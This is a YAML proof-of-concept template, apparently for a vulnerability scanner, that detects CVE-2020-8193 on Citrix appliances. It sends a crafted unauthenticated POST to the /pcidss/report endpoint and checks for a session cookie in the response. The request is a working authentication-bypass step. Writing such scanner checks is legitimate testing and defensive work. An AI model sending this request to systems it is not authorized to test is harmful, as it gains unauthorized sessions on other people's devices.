name: poc-yaml-citrix-cve-2020-8193-unauthorized
set:
  user: randomLowercase(8)
  pass: randomLowercase(8)
rules:
  - method: POST
    path: "/pcidss/report?type=allprofiles&sid=loginchallengeresponse1requestbody&username=nsroot&set=1"
    headers:
      Content-Type: application/xml
      X-NITRO-USER: '{{user}}'
      X-NITRO-PASS: '{{pass}}'
    body: <appfwprofile><login></login></appfwprofile>
    follow_redirects: false
    expression: >
        response.status == 406 && "Set-Cookie" in response.headers && substr(response.headers["Set-Cookie"], 8, 10) != ""
detail:
  author: bufsnake(https://github.com/bufsnake)
  links:
      - https://github.com/PR3R00T/CVE-2020-8193-Citrix-Scanner/blob/master/scanner.py
